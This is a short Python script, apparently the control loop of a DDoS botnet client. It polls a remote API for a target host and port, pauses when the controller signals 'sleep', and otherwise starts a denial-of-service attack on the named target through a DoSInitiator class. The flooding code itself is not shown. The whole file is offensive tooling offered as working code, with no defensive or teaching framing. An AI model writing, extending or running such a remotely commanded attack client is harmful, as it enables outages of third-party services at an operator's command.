import time
import sys

sys.path.append(sys.path[0].replace("client", ""))
from client.api import API
from client.dos import DoSInitiator


# Get API data and start DDoS locally
def main():
    di = DoSInitiator()
    while True:
        api = API()
        data = api.get_data()
        if api.get_state() == 'sleep':
            print("\033[91mSleeping now!\033[0m")
            di.work = False
            time.sleep(5)
            continue
        else:
            di.work = True
            di.start(target_host=data["host"], target_port=int(data["port"]))


if __name__ == '__main__':
    main()
